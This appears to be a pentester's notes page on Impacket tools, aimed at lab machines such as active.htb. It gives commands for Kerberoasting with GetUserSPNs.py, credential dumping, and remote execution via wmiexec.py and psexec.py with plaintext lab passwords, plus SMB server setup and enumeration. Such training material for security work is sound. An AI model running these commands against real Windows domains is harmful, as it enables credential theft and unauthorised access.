---
tags:
  - Exploitation
  - OperatingSystems
  - Windows
  - Tooling
---


## Guide

```
python3 -m pipx install impacket
```

1. [Impacket Guide: SMB/MSRPC - Hacking Articles](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)

## Locating Credentials

```
sudo python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783
```

## Dump Credentials 

[impacket/examples/secretsdump.py at master · fortra/impacket · GitHub](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

## Access with Credentials


`wmiexec.py 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'`

```
python psexec.py  active.htb/administrator:Ticketmaster1968@10.10.10.100
```

## SMB 

See [[2. Enumeration/TCP/445. Server Message Block (SMB)/1. Guide|SMB Guide]] 

1. Can use `psexec.py` to get reverse shell if write access to the entire system

#### Create SMB Server 

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

New versions of Windows block unauthenticated guest access, as we can see in the following command:

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
## SamRDump

```shell-session
samrdump.py 10.129.14.128
```

## RPCDump

[impacket/examples/rpcdump.py at master · fortra/impacket · GitHub](https://github.com/fortra/impacket/blob/master/examples/rpcdump.py)

## SQL

[impacket/examples/mssqlclient.py at master · fortra/impacket · GitHub](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)

### MSSQL

```shell-session
mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

## WMI

```shell-session
wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```